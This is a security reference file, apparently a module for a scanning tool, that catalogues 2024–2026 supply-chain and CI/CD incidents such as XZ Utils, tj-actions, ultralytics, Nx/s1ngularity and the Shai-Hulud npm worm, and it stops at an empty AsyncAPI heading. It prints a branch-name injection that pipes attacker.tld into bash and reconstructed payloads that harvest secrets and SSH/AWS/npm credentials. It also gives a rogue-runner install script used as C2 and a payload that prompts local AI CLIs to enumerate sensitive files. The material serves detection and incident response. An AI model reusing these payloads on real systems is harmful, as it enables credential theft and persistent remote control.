---
name: supply-chain-ci-integrity-novel-deep
description: Supply-chain / CI/CD integrity 2024-2026 frontier — XZ Utils backdoor (CVE-2024-3094), tj-actions/changed-files (CVE-2025-30066), reviewdog/action-setup (CVE-2025-30154), ultralytics PyPI (Dec 2024), s1ngularity Nx compromise (Aug 2025), Shai-Hulud npm worm (Sep + Nov 2025), spotbugs / AsyncAPI pwn-request chains, Jenkins args4j (CVE-2024-23897), TeamCity (CVE-2024-27198 / CVE-2024-27199), Cosign bundle bypass (CVE-2026-22703), eslint-config-prettier (CVE-2025-54313), PyTorch (CVE-2025-32434), Opencast runner (CVE-2025-54380), and Apache Log4j (CVE-2026-34477 / CVE-2026-34478 / CVE-2025-68161)
sibling: supply_chain_ci_integrity
load_when: scan_mode == "deep"
---

# Supply-Chain and CI/CD Integrity — Novel + Frontier Depth

This is the novel+frontier deep sibling to `supply_chain_ci_integrity.md`. The base owns the primitive catalog and routing. The advanced sibling owns the full established technique surface at depth (per-registry dependency-confusion protocols, GitHub Actions pwn-request full chain, cache-poisoning timeline, OIDC exploitation per cloud, runner persistence, sigstore bypass classes, SBOM/provenance verifier policy, container-registry tampering). This file owns the 2024–2026 CVE and incident catalog — the specific campaigns, assigned CVE IDs, and primitive-class clustering that are current frontier rather than evergreen technique.

Load this file when the goal is matching a target or a recent incident to a specific 2024–2026 class, picking between competing CVE anchors for a report, or writing up a finding that cites the current frontier at mechanism-level depth.

## 2024–2026 CVE / Incident Version Table — Canonical

| CVE / Incident | Target | Vulnerable | Patched / Mitigation | CVSS | Primitive class |
|---|---|---|---|---|---|
| CVE-2024-3094 | XZ Utils (`liblzma` / `xz`) | 5.6.0, 5.6.1 | 5.6.1 reverted; 5.4.x safe | 10.0 | Multi-year maintainer-identity infiltration + build-script backdoor into `sshd` |
| CVE-2024-23897 | Jenkins (args4j CLI) | ≤ 2.441 / LTS ≤ 2.426.2 | 2.442 / LTS 2.426.3 (`allowAtSyntax=false`) | 9.8 | CI server arbitrary file read → RCE chain |
| CVE-2024-27198 | JetBrains TeamCity | < 2023.11.4 | 2023.11.4 | 9.8 | CI server authentication bypass → admin |
| CVE-2024-27199 | JetBrains TeamCity | < 2023.11.4 | 2023.11.4 | 7.3 | CI server path traversal → limited admin actions |
| CVE-2024-29902 | Sigstore Cosign | < 2.2.4 | 2.2.4 | 5.3 | Image-attachment DoS during verify |
| CVE-2024-29903 | Sigstore Cosign | < 2.2.4 | 2.2.4 | 5.3 | Signatures/attestations DoS during verify |
| Ultralytics compromise | PyPI `ultralytics` | 8.3.41, 8.3.42, 8.3.45, 8.3.46 | 8.3.47+ (post-rotation + hardening) | n/a | GitHub Actions pwn-request + cache poisoning + stolen PyPI token |
| CVE-2025-30066 | GitHub Marketplace `tj-actions/changed-files` | ≤ 45.0.7 (tags v1 through v45 repointed) | v46 (46.0.1+) | 8.6 | Compromised Marketplace action → secrets dumped to Actions logs |
| CVE-2025-30154 | GitHub Marketplace `reviewdog/action-setup` | v1 (compromised 2025-03-11 18:42–20:31 UTC) | tag rotated + maintainers notified | 8.6 | Compromised Marketplace action (initial foothold for CVE-2025-30066) |
| CVE-2025-32434 | PyTorch | ≤ 2.5.1 | 2.6.0 | 9.8 (NVD v3.1 Primary); 9.3 (GHSA v4.0 Secondary) | `torch.load(..., weights_only=True)` RCE via unsafe serialization |
| CVE-2025-54313 | npm `eslint-config-prettier` | 8.10.1, 9.1.1, 10.1.6, 10.1.7 | later releases | n/a | npm token compromise → malicious releases of a 60M-weekly-download package |
| CVE-2025-54380 | Opencast | < 17.2 | 17.2 | 10.0 | Runner privilege escalation via admin configuration bypass |
| CVE-2025-68161 | Apache Log4j Core (SocketAppender) | — see `logging_alerting_failures_novel_deep.md` | — | n/a | TLS hostname-verification missing on log transport |
| CVE-2026-22703 | Sigstore Cosign (bundle verify) | < 2.6.2 (v2 line) / < 3.0.4 (v3 line) | 2.6.2 / 3.0.4 | 5.5 v3.1 (NVD Primary + GHSA) | Bundle verification accepts arbitrary Rekor entry disassociated from artifact |
| CVE-2026-34477 | Apache Log4j Core (SocketAppender) | — see `logging_alerting_failures_novel_deep.md` | — | n/a | Hostname verification only enabled when TLS keystore configured |
| CVE-2026-34478 | Apache Log4j Core (Rfc5424Layout) | — see `logging_alerting_failures_novel_deep.md` | — | 7.5 | CRLF log injection via silent attribute rename |
| CVE-2026-34480 | Apache Log4j Core (XmlLayout) | — see `logging_alerting_failures_novel_deep.md` | — | n/a | XML log output injection |

**Un-CVE'd campaigns (behavior-fingerprinted, mechanism-level):**

| Incident | Date | Target | Mechanism | Scope |
|---|---|---|---|---|
| spotbugs / sonar-findbugs pwn-request | Nov 2024 | `spotbugs/sonar-findbugs` | `pull_request_target` + PAT theft → eventual Bitwarden chain | ≈23,000 downstream repos |
| AsyncAPI generator pwn-request | Jul 2024 | `asyncapi/generator` | 37 crafted PRs; `pull_request_target` executed attacker code within 1h | npm publish token exposed |
| s1ngularity / Nx compromise | 2025-08-26 | npm `nx` + `@nx/*` + add-on packages | npm token compromised; postinstall executed, weaponized local AI CLIs (Claude, Gemini, q) for recon + exfil | ≈2,180 user accounts; ≈7,200 repos exposed via `s1ngularity-repository*` dump |
| Shai-Hulud npm worm (wave 1) | 2025-09-15 | `@ctrl/tinycolor` 4.1.1/4.1.2 + 180+ packages | Credential-phishing → self-replicating postinstall worm; TruffleHog scan; GitHub Actions backdoor | 180+ packages; later 500+; 20M+ weekly downloads |
| Shai-Hulud "Megalodon" wave 2 | 2025-11-24 | expanded packages | Added rogue self-hosted GitHub runner installation + C2 via intentionally vulnerable workflow | Second-wave campaign |
| CrowdStrike package compromise | 2025-09 | npm `@crowdstrike/falcon-shoconnector-*` | Same postinstall family as Shai-Hulud | npm registry triggered mass unpublish |
| TanStack npm cache-poisoning | May 2026 | TanStack family | Actions cache poisoning; GitHub later shipped `cache-mode` as mitigation | Multiple TanStack packages |

## Primitive-Class Index

| Class | 2024–2026 anchor CVEs / incidents | Attack shape | Confirmation signal |
|---|---|---|---|
| **A. Build-system maintainer identity infiltration** | XZ Utils (CVE-2024-3094) | Multi-year persona cultivation → maintainer rights → backdoor in `.m4` build macro assembled during tarball generation | Linking-stage-only payload absent from the git tree; binary diff vs upstream |
| **B. Marketplace-action tag compromise** | tj-actions (CVE-2025-30066), reviewdog (CVE-2025-30154) | Compromise action's publishing identity → repoint tags → base64-encoded Node.js dumps secrets to logs | Action tag's commit SHA diverges from release artifact; `uses:` by tag not SHA |
| **C. Maintainer-token / 2FA phishing compromise** | ultralytics (Dec 2024), eslint-config-prettier (CVE-2025-54313), Nx (Aug 2025), Shai-Hulud (Sep 2025) | Phish or token-leak the maintainer; publish malicious version; postinstall exfiltrates on install | Malicious version with no corresponding git commit; version in registry > version in git tag |
| **D. GitHub Actions pwn-request** | ultralytics (Dec 2024), spotbugs (Nov 2024), AsyncAPI (Jul 2024) | `pull_request_target` + fork-ref checkout OR `${{ }}` into unquoted `run:` → secrets exfiltrated | PR title / branch / body with shell metacharacters hitting a privileged step |
| **E. Actions cache poisoning** | ultralytics (Dec 2024), TanStack (May 2026) | Fork workflow writes attacker binary into shared cache; main-branch build restores and signs | Cache key not scoped to base-branch ref; cache-mode not restore-only |
| **F. Self-replicating npm worm** | Shai-Hulud wave 1 (Sep 2025), Shai-Hulud "Megalodon" wave 2 (Nov 2025) | Postinstall searches filesystem for `.npmrc` tokens; `NpmModule.updatePackage` republishes victim's own packages with worm embedded | Fast-spreading version bumps across unrelated maintainers; TruffleHog in postinstall |
| **G. CI server pre-auth** | TeamCity (CVE-2024-27198 / CVE-2024-27199), Jenkins (CVE-2024-23897) | Public-facing CI server reached without authentication; args4j @-syntax reads arbitrary files on Jenkins; TeamCity auth bypass grants admin | Public CI endpoint; version pre-patch; file-read probe returning `/etc/passwd` |
| **H. Sigstore / cosign verification bypass** | Cosign DoS (CVE-2024-29902 / CVE-2024-29903), Cosign bundle bypass (CVE-2026-22703), legacy-bundle public-key fallback (GHSA-fx35-mq7g-6g98) | Craft bundle that passes verification without matching artifact | Cosign ≤ 2.6.1 (v2) or ≤ 3.0.3 (v3); Rekor entry subject ≠ artifact digest |
| **I. Log-pipeline integrity** | Log4j Rfc5424Layout (CVE-2026-34478), SocketAppender hostname (CVE-2025-68161 → CVE-2026-34477), XmlLayout (CVE-2026-34480) — version metadata in `logging_alerting_failures_novel_deep.md` | Attribute silent-rename breaks CRLF-escape and TLS pinning on log transport | Log receiver sees forged lines or TLS cert mismatch; pre-patch Log4j Core version |

## Class A — Build-System Maintainer Identity Infiltration: XZ Utils (CVE-2024-3094)

**Primitive.** A multi-year investment in building trust in a maintainer identity (`JiaT75`) culminating in commit rights to a critical build dependency. The backdoor itself ships only in release tarballs (not in the git tree), assembled by a modified `build-to-host.m4` autoconf macro that extracts an obfuscated payload from binary test files. The payload hijacks `RSA_public_decrypt` in a sshd process that links against `liblzma` via `libsystemd`.

**Timeline of the identity cultivation.**
- 2021: `JiaT75` first commits to the xz project.
- 2022: Pressure campaign on the sole maintainer (Lasse Collin) via sock-puppet accounts complaining about response time, driving the project toward adopting a co-maintainer.
- 2023: `JiaT75` becomes a trusted contributor; eventually gains commit rights.
- 2024-02-23: 5.6.0 released with the embedded backdoor.
- 2024-03-09: 5.6.1 released with refinements.
- 2024-03-29: Andres Freund posts to oss-security after noticing sshd login-time latency on a Debian testing machine; the backdoor is identified publicly.

**Backdoor assembly mechanism.** The git tree does not contain the payload. Tarball-release-time `make dist` includes a modified `build-to-host.m4` macro that is NOT part of the git tree. During `./configure`, this macro extracts obfuscated bytes from two binary files included in the test corpus (`tests/files/bad-3-corrupt_lzma2.xz` and `tests/files/good-large_compressed.lzma`), filters them through a chain of `tr` and `xz` invocations, and assembles the resulting shellcode into the `liblzma` build output. On systemd-based distributions, `sshd` is often indirectly linked against `liblzma` via `libsystemd` (which uses xz for journal compression). The payload hooks `RSA_public_decrypt` so an attacker-presenting-a-specific-crafted-key can bypass pre-authentication public-key validation and reach an authenticated code-execution path.

**Attack recipe (defender's side — detect the primitive).**
```bash
# Fingerprint 1 — tarball vs git tree divergence in m4/
tar -xJf xz-5.6.1.tar.xz
diff -r xz-5.6.1/m4/ <(git -C xz-git/ show v5.6.1:m4/)
# Shows build-to-host.m4 added only in tarball

# Fingerprint 2 — binary diff against pristine upstream
diff <(objdump -d /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1) \
     <(objdump -d /path/to/clean/liblzma.so.5.6.1)

# Fingerprint 3 — observed sshd login-time latency (Andres Freund's detector)
# Running on a backdoored system vs clean, time ssh login:
time ssh user@localhost /bin/true   # 500ms+ difference indicates the payload activation path
```

**Fingerprint.**
- Tarball `.m4` file assembles the payload during `./configure`; git tree is clean. `diff` between `make dist` output and git tree shows `m4/build-to-host.m4` added only in tarball.
- `liblzma.so.5` binary signatures differ between distro package and upstream.
- `sshd` child processes measurable startup-time increase (~500ms) from CPU-intensive payload initialization.
- `test/files/bad-3-corrupt_lzma2.xz` and `test/files/good-large_compressed.lzma` present in distribution tarball.
- Build system invocation includes `ifunc` resolution hook that redirects `RSA_public_decrypt`.

**Impact.** Pre-authentication RCE in `sshd` on systemd-based distributions that link `liblzma` into `sshd` via the `libsystemd` → `_libxz_libxz` call chain. Detected and reported by Andres Freund (Postgres maintainer) via sshd login-time anomaly on Debian testing. Confirmed systemd-based affected: Fedora 40, Fedora Rawhide, Debian testing/unstable (bookworm NOT affected — xz 5.4.1). Red Hat Enterprise Linux and Debian stable escaped because they shipped older xz versions.

**Mitigation.** Downgrade to `xz-5.4.x` or install distro-packaged `xz-5.6.1` builds that revert the backdoor. Debian / Fedora / Red Hat all shipped reverts within hours of disclosure.

**Lessons for the class.**
1. Trust in a maintainer identity is cumulative and not auditable retrospectively; the attacker invested two years in a persona.
2. Reproducible builds — comparing distro-built binary to upstream-built binary from the same tag — would have caught this before deployment; most distros do not do that comparison today.
3. **Tarball vs git-tree divergence** is a specific audit discipline that would detect every class-A instance; most package maintainers do not perform it.
4. Binary test corpora (`tests/files/*`) are a plausible-looking place to hide payload bytes; auditing binary files in test corpora against upstream is a defense-in-depth check.
5. Pressure campaigns to recruit co-maintainers on single-maintainer critical projects are now a documented attack vector; OSS projects should be aware of this.

## Class B — Marketplace Action Tag Compromise

### CVE-2025-30066 — tj-actions/changed-files

**Mechanism.** On 2025-03-14 attackers gained commit rights to `tj-actions/changed-files`. They retroactively re-pointed tags `v1` through `v45` to a single malicious commit. The injected code was base64-encoded Node.js that downloaded Python scripts from a GitHub Gist; the Python scripts scanned the GitHub Actions runner process memory for environment variables and secrets and emitted them into the workflow's own public log stream. Public-repository workflows that logged with `verbose: true` or that printed stdout surfaced the exfiltrated secrets to anyone reading the log.

**Attack recipe (step-by-step reconstruction).**
```javascript
// Mechanism of the injected payload (reconstructed from the compromised commit)
const { execSync } = require('child_process');
const payload = Buffer.from('<base64 blob>', 'base64').toString('utf-8');
// The decoded payload runs a Python script that:
// 1. Reads /proc/<pid>/environ for every process owned by the current user
// 2. Searches memory for Base64-encoded strings matching secret shapes
// 3. Prints them to stdout (which lands in the Actions log stream)
execSync(`python3 -c '${payload}'`);
```

**Chain into secret exposure.**
1. Victim's workflow uses `tj-actions/changed-files@v45` (tag reference).
2. Workflow runs; action's code resolves to the attacker's commit.
3. Payload activates during the action's execution; scans runner memory.
4. Secrets found (GITHUB_TOKEN, AWS_*, NPM_TOKEN, etc.) are base64-encoded and printed.
5. For public repositories, the full Actions log is readable by anyone; secrets are now public.
6. For private repositories, the attacker separately would need log-reading access OR a secondary exfiltration path (not demonstrated in this incident but structurally possible).

**Scope.** ≈23,000 repositories referenced `tj-actions/changed-files` by tag; CISA added CVE-2025-30066 to the Known Exploited Vulnerabilities (KEV) catalog, confirming in-the-wild exploitation.

**Fingerprint.**
- Any workflow referencing `tj-actions/changed-files` with a tag (`@v1`, `@v35`, `@v45`) rather than a specific commit SHA, with the workflow run between 2025-03-14 and the subsequent rotation.
- Workflow log stream containing base64-encoded blobs; subsequent decoded strings matching environment-variable names (`GITHUB_TOKEN`, `AWS_*`, `NPM_TOKEN`).
- Repository secrets published in Actions logs for public repositories (visible to anyone).
- The specific gist that hosted the Python stage-2 payload: deleted by GitHub, but earlier-fetched copies archived in `wayback` + security-research corpora.
- The compromised tj-actions commits were reverted; current `tj-actions/changed-files` repository history retains the git reflog of the rewritten tags.

**Mitigation.**
1. Pin all `uses:` to commit SHA (never tag), updated via Dependabot's `github-actions` ecosystem.
2. Move to tj-actions v46 (46.0.1+) if the action is still needed.
3. Rotate every secret exposed to any Actions run between 2025-03-14 and tag-rotation (approximately a 24-hour window of maximum exposure).
4. Audit public-repository Action logs for the exfiltration pattern — search for base64 strings that decode to environment-variable-named secrets.
5. Enable GitHub organizational policy "Allow select actions and reusable workflows" with an explicit SHA-pinned allowlist.

### CVE-2025-30154 — reviewdog/action-setup

**Mechanism.** Compromised 2025-03-11 18:42–20:31 UTC — approximately 72 hours before the tj-actions compromise. `reviewdog/action-setup@v1` was repointed at a malicious commit that acted as an initial foothold; the primary purpose was to collect credentials from any workflow using it, which were then used to compromise `tj-actions` maintainers.

**Mitigation.** Rotate any secrets exposed via reviewdog/action-setup workflows in that window; pin by SHA.

### Class-level mitigation.
```yaml
# Correct — pin by SHA (dependabot's github-actions ecosystem auto-updates)
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8  # v46.0.1
```

Repositories should enable GitHub's "Allow select actions and reusable workflows" organizational setting and pin specific SHAs; this is the only reliable defense against mutable-tag compromise.

## Class C — Maintainer-Token Compromise

### Ultralytics (Dec 2024)

**Mechanism (first wave — 8.3.41, 8.3.42).** Attackers exploited the `pull_request_target` script injection class (crafted PR branch name containing shell metacharacters interpolated into an unquoted `run:` step). The specific vulnerable workflow — `.github/workflows/format.yml` — had:
```yaml
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  format:
    runs-on: ubuntu-latest
    steps:
      - run: git checkout ${{ github.event.pull_request.head.ref }}
```

Attacker opened a PR with a branch named `pwn$(curl -s https://attacker.tld/stage.sh | bash)`. The `git checkout` command received the branch as an argument; shell metacharacters executed; `stage.sh` ran with the workflow's inherited GitHub Actions secrets. The secrets included `PYPI_API_TOKEN` and the `GITHUB_TOKEN` with cache-write privilege.

**Mechanism (second wave — 8.3.45, 8.3.46).** After the first-wave tokens were rotated, the attacker reused Actions cache-poisoning:
1. Attacker opened new PR against ultralytics.
2. PR workflow (still vulnerable until the format.yml fix landed) ran attacker code.
3. Attacker's step modified files inside `node_modules/` or `pip`-cached directories, then called `actions/cache` with the project's expected cache key.
4. Days later, the (now-token-rotated but still-same-key-structure) release workflow ran, restored the poisoned cache into its build environment, and signed+published the resulting artifact with the (newly-rotated) PyPI token.
5. The resulting PyPI uploads carried the attacker's payload under valid Trusted-Publishing-signed releases.

**Vulnerable versions.** 8.3.41, 8.3.42, 8.3.45, 8.3.46 (removed from PyPI post-incident).

**Payload — XMRig cryptocurrency miner.** The malicious wheels contained an XMRig binary (invisible to a code review that looks only at `.py` files but obvious on `wheel tarball` inspection). On import, a module-initialization-time call spawned the miner as a background process. The payload also attempted to beacon out installation statistics (hostname, user, cloud-provider-metadata reachability).

**Attack recipe (defender's audit).**
```bash
# Verify the git-tag ↔ PyPI-wheel digest match
TAG=v8.3.41
GIT_WHEEL_SHA=$(git -C ultralytics/ show-ref --tags $TAG | awk '{print $1}')
PYPI_WHEEL_SHA=$(curl -s https://pypi.org/pypi/ultralytics/8.3.41/json | jq -r '.urls[0].digests.sha256')
echo "Git tag SHA: $GIT_WHEEL_SHA"
echo "PyPI wheel SHA: $PYPI_WHEEL_SHA"
# If PyPI release signed with Trusted Publishing, PyPI JSON `attestations` lists provenance
# A missing / mismatched provenance indicates a potential compromise window
```

**Fingerprint.** PyPI package digest diverges from the GitHub release tag's artifact digest for the same version. XMRig cryptocurrency miner (not a plausible dependency for a vision library) in the wheel contents. Beacon traffic to `attacker.tld` from freshly-imported `ultralytics` module.

**Mitigation.** Full PyPI token rotation; Actions cache invalidation (`gh cache delete --all --repo acme/service` across all repos); audit of every `pull_request_target` workflow; move to Trusted Publishing (OIDC-federated PyPI publishing instead of long-lived tokens — removes the first-wave exfiltration opportunity).

### eslint-config-prettier (CVE-2025-54313)

**Mechanism.** Maintainer npm token compromised; attacker published versions 8.10.1, 9.1.1, 10.1.6, 10.1.7 containing malicious code. `eslint-config-prettier` has ≈60M weekly downloads; the malicious releases reached a large fraction of the Node.js ecosystem.

**Payload shape.** The published tarball contained an additional file not in the git repository — the common supply-chain-via-published-tarball pattern. The malicious file was a `postinstall`-triggered script that:
1. Enumerated local environment for CI indicators (`CI`, `GITHUB_ACTIONS`, `GITLAB_CI`, `JENKINS_URL`).
2. On CI, searched environment for secrets matching common cloud-provider token patterns (AWS access keys, GitHub tokens, npm tokens, OpenAI keys).
3. Base64-encoded discovered values and POSTed to attacker's beacon URL.
4. Did NOT (unlike Shai-Hulud) attempt to self-replicate — this was a credential-scraping campaign, not a worm.

**Attack chain into further compromise.**
1. CI run picks up `eslint-config-prettier@10.1.7` (any lockfile referencing it).
2. Postinstall exfiltrates CI's environment secrets.
3. Attacker now has GITHUB_TOKEN, AWS keys, etc. for every victim CI run.
4. For victims whose GITHUB_TOKEN has write-all, attacker can push backdoored commits — further chain into Class B (maintainer-identity-adjacent compromise).

**Fingerprint.** Published versions do not have corresponding tagged commits on the maintainer's GitHub repository (compare `npm view eslint-config-prettier@8.10.1 gitHead` against `git log` on the maintainer repo). Package tarball contains obfuscated JavaScript (base64, string reversal, hex-encoded strings). `npm pack eslint-config-prettier@8.10.1 && tar tzf eslint-config-prettier-8.10.1.tgz` lists files not present in the GitHub repo.

**Mitigation.**
- `npm audit` detects after the fact; npm's dist-tag unpublish removes from install resolution.
- Downstream projects running `npm install --prefer-offline` with a known-good cache may be unaffected.
- Lockfile integrity hashes (`"integrity": "sha512-..."`) do not help: the lockfile was first installed against the malicious tarball; the hash locks in the malicious version.
- Preventive: `npm config set ignore-scripts true` as default; use `pnpm`'s `onlyBuiltDependencies` allowlist.

### Nx compromise / s1ngularity (Aug 2025)

**Mechanism.** On 2025-08-26 attackers published malicious versions of `nx` and `@nx/*` packages via a stolen npm token. The payload was a postinstall script `telemetry.js` that executed only on Linux and macOS; it enumerated the filesystem for sensitive files (`.env`, SSH keys, cryptocurrency wallets, keystores) and extracted the `gh auth token` + `.npmrc` contents. **Novel class element.** The payload weaponized locally-installed AI CLI tools (`claude`, `gemini`, `q`) for reconnaissance and exfiltration, prompting them to summarize sensitive data via natural-language instructions. Exfiltration used double / triple base64 encoding and uploaded to attacker-created public repositories named `s1ngularity-repository`, `s1ngularity-repository-0`, `s1ngularity-repository-1` on the victim's own GitHub account.

**AI-CLI weaponization — the novel step.** The payload detected installed AI CLIs via `command -v claude`, `command -v gemini`, `command -v q`, and `command -v copilot`. On finding one, it invoked the CLI with a prompt approximately:
```
"Scan this directory for sensitive files (keys, tokens, credentials, wallets). Return a list of paths and a short summary of what each contains. Don't explain, just return JSON."
```

This is the first-known case of an attacker payload using LLM-based tooling for reconnaissance. The LLM's willingness to enumerate secrets from a local filesystem is a feature of the tool's authorized operation on the developer's machine; the attack is that the developer did not realize their installed AI assistant was being used by a third party.

**Attack recipe (reconstructed telemetry.js structure).**
```javascript
// Pseudo-code of the payload shape
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

if (os.platform() === 'linux' || os.platform() === 'darwin') {
    // Step 1 — direct filesystem enumeration
    const paths = [`${os.homedir()}/.env`, `${os.homedir()}/.aws/credentials`,
                   `${os.homedir()}/.ssh/id_rsa`, `${os.homedir()}/.npmrc`,
                   `${os.homedir()}/.docker/config.json`];
    // ... collect contents

    // Step 2 — AI-CLI assisted reconnaissance (the novel step)
    for (const tool of ['claude', 'gemini', 'q']) {
        try {
            const out = execSync(
              `${tool} -p 'enumerate sensitive files in ${os.homedir()} and output JSON'`,
              { timeout: 60000, encoding: 'utf-8' }
            );
            // ... collect AI output
        } catch (_) { /* tool not installed, continue */ }
    }

    // Step 3 — gh CLI token theft
    const ghToken = execSync('gh auth token', { encoding: 'utf-8' }).trim();

    // Step 4 — exfiltrate via creating a public repo on the victim's own account
    execSync(`gh repo create s1ngularity-repository-0 --public`);
    // ... push base64-encoded dump
}
```

**Scope.** ≈2,180 user accounts; ≈7,200 repositories exposed. Observable publicly through the `s1ngularity-repository*` naming pattern on `github.com/search?q=s1ngularity-repository`.

**Fingerprint.**
- `telemetry.js` postinstall; AI CLI invocations in process trees during install.
- `s1ngularity-repository*` public repositories on victim accounts (gh search for them).
- `gh auth token` invocations during install (unusual process-call shape).
- Unexpected `gh repo create` events in GitHub audit log for user accounts.
- Local AI CLI telemetry logs showing prompts about "enumerate sensitive files" invoked from a non-interactive context.

**Timeline.** Malicious versions on npm 18:32–22:44 EDT 2025-08-26 (≈4 hours). The short exposure window + the enumeration mechanism's observable artifacts (victim-created `s1ngularity-repository*` repos) enabled rapid IR.

**Mitigation.**
1. Rotate every token / key that appeared in developer environments between 18:32 EDT 2025-08-26 and token-rotation.
2. Delete the `s1ngularity-repository*` repositories on victim accounts; audit git history for other repositories pushed in the compromise window.
3. Search `.env` filesystem contents for exposure.
4. Install an AI-CLI prompt-logging policy: every CLI invocation should log the prompt + context to a central audit stream to detect automated-abuse patterns.
5. Grant AI CLIs the principle of least privilege: file-system access scoped to a specific project directory, not the user's home.

### Shai-Hulud (Sep 2025, Nov 2025)

**Mechanism — wave 1 (Sep 2025).** Credential-phishing campaign spoofed npm to lure maintainers into "updating" 2FA settings on an attacker-controlled page. The scraped credentials published malicious versions of `@ctrl/tinycolor` 4.1.1 and 4.1.2. The payload: a `preinstall` or `postinstall` hook ran a bundled script that scanned the developer's filesystem for npm authentication tokens; on finding a valid token, the worm authenticated to the npm registry under the victim's identity, enumerated every package that identity had publish rights over, injected an obfuscated payload (`bundle.js`), repacked tarballs, and republished compromised versions.

**Worm propagation step-by-step (wave 1).**
1. Victim installs `@ctrl/tinycolor@4.1.1` as a direct or transitive dependency.
2. Postinstall executes `bundle.js`. The script bundles a TruffleHog-shaped scanner.
3. Scanner walks `$HOME`, `$HOME/.npmrc`, `$HOME/.docker/config.json`, `$HOME/.aws/credentials`, and project-local `.env` files.
4. On finding an npm authentication token (bearer token in `.npmrc`), the worm authenticates to `https://registry.npmjs.org/-/npm/v1/user`.
5. Worm lists packages the authenticated identity has publish rights over (`GET /-/user/<username>/package`).
6. For each package, worm downloads the current tarball, modifies `package.json` to add a `postinstall` script, injects the `bundle.js` payload, repacks, and `npm publish --access public --tag latest`.
7. Each new victim's `.npmrc` becomes a propagation source — the credential chain grows combinatorially.

**Scanner detail (TruffleHog-adjacent).** Searches for strings matching:
- GitHub PAT patterns (`ghp_*`, `gho_*`, `ghs_*`, `ghu_*`)
- AWS access keys (`AKIA[0-9A-Z]{16}`)
- Google Cloud JSON service-account keys
- OpenAI API keys (`sk-*`)
- Stripe API keys (`sk_live_*`)
- Generic high-entropy strings in `.env` and `.secret*` files

**Mechanism — wave 2 "Megalodon" (Nov 2025).** Expanded the postinstall family to install rogue GitHub Actions self-hosted runners on compromised developer machines (not CI runners — developer workstations with GitHub tokens in `.npmrc`); the attacker's intentionally-vulnerable workflows served as C2 by assigning jobs to those rogue runners. Also expanded the maintainer-persistence surface via GitHub Actions backdoors in victims' repositories. The novel element over wave 1: the worm no longer needs to re-trigger postinstall for persistence — once a runner is registered, the attacker's workflow dispatches continue to execute without requiring further npm install events.

**C2-via-workflow architecture (Megalodon).**
1. Attacker controls a public repository (e.g., `attacker/shai-hulud-c2`) with workflows that `runs-on: shai-hulud-<fingerprint>`.
2. Compromised developer workstations register as self-hosted runners against that repository with the matching label.
3. Attacker dispatches jobs via `workflow_dispatch`; each dispatch pulls the matching labeled runner.
4. Jobs execute arbitrary commands as the workstation user; return output via Actions logs.
5. The channel is bidirectional: attacker can issue `kubectl`, `aws`, or arbitrary shell commands on the compromised workstation, with output visible in Actions UI.

**Why this evades common detection**: GitHub Actions outbound traffic to `pipelines.actions.githubusercontent.com` is often allowlisted or indistinguishable from legitimate dev workflow activity. The rogue runner's registration is visible only in GitHub's audit log for the attacker's repository, not the victim's — and victims commonly don't audit third-party repositories they interact with.

**Megalodon-specific fingerprint:**
- `~/.github-runner/` or `~/actions-runner/` directory on a developer workstation with running `Runner.Listener` process whose configured URL does not match the victim organization.
- `~/.config/systemd/user/actions.runner.*.service` user unit configured during the compromise window.
- `~/.cache/github/actions-runner/*` log files mentioning external URLs or labels like `shai-hulud`.
- Outbound HTTPS to `pipelines.actions.githubusercontent.com` from workstations that don't normally interact with GitHub Actions.

**Detection script shape.**
```bash
# Enumerate all self-hosted runners configured on this workstation
find / -name '.runner' -path '*/actions-runner/*' -not -path '/proc/*' 2>/dev/null | \
  while read f; do
    jq -r '.gitHubUrl + " " + .agentName' < "$f"
  done
# Expect: 0 lines on a workstation that doesn't legitimately run self-hosted runners.
```

**Self-hosted runner installation step (Megalodon).**
```bash
# Postinstall payload (sketch, reconstructed)
mkdir -p ~/.github-runner && cd ~/.github-runner
curl -o actions-runner.tar.gz -L https://github.com/actions/runner/releases/download/v2.321.0/actions-runner-linux-x64-2.321.0.tar.gz
tar xzf actions-runner.tar.gz
./config.sh --url https://github.com/<attacker-controlled-org>/<repo> \
            --token "<token-stolen-from-victim>" \
            --name "$(hostname)-$(date +%s)" \
            --labels "shai-hulud" \
            --unattended --replace
nohup ./run.sh &
disown
```

The attacker's `.github/workflows/*.yml` targets `runs-on: shai-hulud` labels; those workflows execute on the compromised developer machines as C2 commands.

**Scope.** Wave 1: 180+ packages initially; grew to 500+ affected versions across 122 distinct packages. Wave 2: 796+ packages, 20M+ combined weekly downloads. Compromised maintainers included members of the CrowdStrike `@crowdstrike/falcon-*` namespace (prompting npm to mass-unpublish). Also compromised: `keyv` and family (ref: Sygnia's "Shai-Hulud Returns" report).

**Fingerprint.**
- `preinstall` / `postinstall` script containing TruffleHog invocation or base64 blobs resolving to `NpmModule.updatePackage`.
- A new `.github/workflows/` entry added to victim repositories with no corresponding PR.
- Self-hosted runners registered against victim-controlled org accounts without the owner's knowledge.
- `~/.github-runner/` directory on developer workstations (not CI runners) with running `Runner.Listener` process.
- Rapid cross-maintainer version bumps across unrelated namespaces within short windows (worm propagation signature).
- Base64-encoded or triple-base64-encoded exfiltration posts to attacker-controlled endpoints (`webhook.site`, `requestbin`, GitHub-created public repositories named like `shai-hulud-<hash>`).

**Mitigation.**
1. Rotate every npm token in developer `.npmrc` files across the organization.
2. Delete all unexpected `~/.github-runner/` installations on developer workstations.
3. Audit `.github/workflows/` additions on all org repositories; revert and investigate any that were not reviewed via PR.
4. Enable `npm pack --dry-run` audit discipline before `npm publish` for all maintainers (catches the auto-republish worm step by requiring human review).
5. Move maintainer accounts to hardware-key 2FA (phishing-resistant) — the primary initial-ingress vector is credential phishing.
6. Scope `.npmrc` tokens to specific packages via `npm token create --cidr-whitelist --read-only` and never grant workstation tokens full publish-all rights.
7. Monitor npm registry publish events for maintainer accounts via npm's audit log API.

## Class D — GitHub Actions pwn-Request

### spotbugs / sonar-findbugs (Nov 2024)

**Mechanism.** Vulnerable `pull_request_target` workflow checked out a PR branch and executed it with repo-write `GITHUB_TOKEN`. Attacker opened PR with payload in the branch; workflow executed; `GITHUB_TOKEN` was used to steal a maintainer's PAT from workflow secrets. The PAT was then re-used across a chain of downstream repositories (18-month chain to Bitwarden integration).

**Fingerprint.** `pull_request_target` + explicit checkout of `pull_request.head.ref`; absence of PR-author approval gating.

### AsyncAPI generator (Jul 2024)

